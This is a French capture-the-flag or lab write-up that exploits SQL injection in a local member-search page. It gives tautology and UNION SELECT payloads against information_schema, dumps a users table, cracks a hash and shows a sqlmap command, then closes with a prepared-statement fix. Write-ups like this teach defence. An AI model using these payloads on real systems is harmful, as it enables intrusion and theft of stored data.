# Recherche

- On peut trouver dans le menu principal un bouton **Members**, qui nous amène sur une page ou l'on peut **rechercher des membres** par leurs ID.

- Lorsque l'on rentre **quelque chose au hasard**, on peut voir que l'on **obtient le message**:

```sql
Unknown column '...' in 'where clause'
```

- On peut donc en déduire qu'il y a une **faille SQL** dans la **requête**.

# Exploit

- Il s'agit d'un **problème de sécurisation** autour d'une **requête SQL**, autrement dit il est possible de faire une **injection SQL**.

- **L'injection SQL** est une **vulnérabilité de sécurité grave** qui peut conduire à une **variété de problèmes de sécurité**, y compris la **divulgation de données sensibles**, la **corruption** ou la **perte de données**, et dans certains cas, la **prise de contrôle complète de la base de données et du système hôte**.

- En supposant que la valeur demandée est ensuite **comparée** à une valeur dans la **base de données**, on peut essayer d'entrer `1 OR 1=1`. Cette requête va faire que la **comparaison n’échoue jamais** et retourne toujours un résultat, ce qui permet de **récupérer tous les membres de la base de données**.

```text
ID: 1 OR 1=1  
First name: one
Surname : me

ID: 1 OR 1=1  
First name: two
Surname : me

ID: 1 OR 1=1  
First name: three
Surname : me

ID: 1 OR 1=1  
First name: Flag
Surname : GetThe
```

- On voit ici que l'element 4 contient le **flag**, il faut dont chercher une **table** qui s’appellerait `members` ou `users`. On peut supposer que la **requête** est la suivante:

```SQL
SELECT user_id, first_name, last_name FROM users WHERE id = $_GET['id']
```

- On peut élaborer une **requête SQL** pour récupérer **les données que l'on cherche**:
  - `UNION`: nécessaire pour **combiner** les résultats de la **requête originale** avec les ceux de la **requête que l'on va faire**.
  - `SELECT`: sélectionne les **colonnes** que l'on veut.
  - `FROM`: sélectionne la **table** que l'on veut.
  - `information_schema.tables`: regroupe toute les **informations sur les tables**.

- Tout d'abord, il nous faut choisir la **bonne table**. Pour afficher **l'ensemble des tables**, on utilise:

```SQL
1 UNION SELECT table_name, NULL FROM information_schema.tables
```

- On vois une table `users` qui correspond à **ce que l'on cherche**. On va **lister** toute les **colonnes** de `users`:

```SQL
1 UNION SELECT table_name, column_name FROM information_schema.columns
```

- Ensuite, on peut lister les **éléments présents** dans la table `users`, jusqu'à trouver **ce que l'on cherche**:

```SQL
1 UNION SELECT Commentaire, countersign FROM users
```

```text
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

- On peut utiliser <a href="https://md5decrypt.net/">MD5Decrypt</a> pour décrypter le **mot de passe**. On obtient alors: `FortyTwo`, soit `fortytwo` en **minuscule**. en utilisant <a href="https://www.https://md5decrypt.net/Sha256/">MD5Decrypt</a> encore une fois, on peut obtenir le **hash sha256** de `fortytwo`: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`.

#### SQLMAP

- On peut utiliser **SQLMAP** pour **automatiser** la recherche de **faille SQL**:

```python
python3 sqlmap.py -u http://127.0.0.1:8080/index.php\?page\=member\&id\=1\&Submit\=Submit --dump -T users
```

# Fix

- Pour éviter les **Injections SQL**, il faut utiliser des **requêtes préparées**, qui **séparent** les instructions SQL des données utilisateur.

```PHP
$mysqli = new mysqli("localhost", "username", "password", "database");

// Check connection
if ($mysqli->connect_error) {
    die("Connection failed: " . $mysqli->connect_error);
}

$searchTerm = $_GET['search'];

// Prepare statement
$stmt = $mysqli->prepare("SELECT * FROM table_name WHERE column_name LIKE ?");
$searchTerm = "%$searchTerm%";
$stmt->bind_param("s", $searchTerm);

// Execute statement
$stmt->execute();

// Close statement and connection
$stmt->close();
$mysqli->close();
```
